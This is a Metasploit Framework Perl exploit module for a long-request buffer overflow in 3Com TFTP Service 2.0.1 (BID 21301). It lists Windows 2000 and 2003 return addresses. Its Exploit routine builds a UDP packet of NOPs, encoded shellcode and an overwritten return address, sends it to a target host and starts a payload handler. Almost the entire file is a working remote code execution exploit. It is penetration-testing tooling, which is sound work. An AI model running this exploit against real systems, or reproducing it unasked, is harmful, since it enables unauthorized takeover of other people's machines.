
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::3ctftp_overflow;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };

my $info =
  {

	'Name'     => '3CTftpSvci Server 2.0.1 Long Request Buffer Overflow',
	'Version'  => '$',
	'Authors'  => [ 'grutz [at] jingojango.net', ],
	'Arch'     => [ 'x86' ],
	'OS'       => [ 'win32', 'winnt', 'win2000', 'winxp' ],
	'Priv'     => 0,
	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 69],
		'SSL'   => [0, 'BOOL', 'Use SSL'],
	  },
	'AutoOpts' => { 'EXITFUNC' => 'thread' },
	'Payload' =>
	  {
		'Space'     => 440,
		'BadChars'  => "\x00",
		'Prepend'   => "\x81\xc4\x54\xf2\xff\xff",  # add esp, -3500
		'Keys'      => ['+ws2ord'],
	  },

	'Description'  => Pex::Text::Freeform(qq{
	3Com TFTP Service version 2.0.1 suffers from a long type buffer
	overflow during TFTP requests.

	Liu Qixu of NCNIPC published this vulnerability.
}),

	'Refs'  =>  [
		['URL' => 'http://support.3com.com/software/utilities_for_windows_32_bit.htm'],
		['BID' => 21301],
	  ],

	'Targets' =>
	  [
		['Windows 2000 - ws2help call esi',   0x750217ae ], # call esi ws2help
		['Windows 2000 Pro SP4 English', 0x7C2EE9BB], # JMP ESI advapi32
		['Windows 2003 SP0/SP1 English', 0x77d3f38e], # CALL ESI user32
	  ],
	'DefaultTarget' => 0,
	'Keys' => ['tftp'],
	'DisclosureDate' => 'Nov 27 2006',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Exploit
{
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
	my $target = $self->Targets->[$target_idx];

	my $sploit =
	  "\x00\x02". Pex::Text::AlphaNumText(1). "\x00".
	  $self->MakeNops(473) .
	  pack('V', $target->[1]).
	  "\x00";

	substr($sploit, 9, length($shellcode), $shellcode);

	$self->PrintLine('[*] Sending ' . length($sploit) . ' bytes');
	$self->PrintLine(sprintf("[*] Trying to exploit target %s 0x%.8x", $target->[0], $target->[1]));

	my $s = Msf::Socket::Udp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );
	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	$s->Send($sploit);
	$self->Handler($s);
	$s->Close();
	return;
}

1;
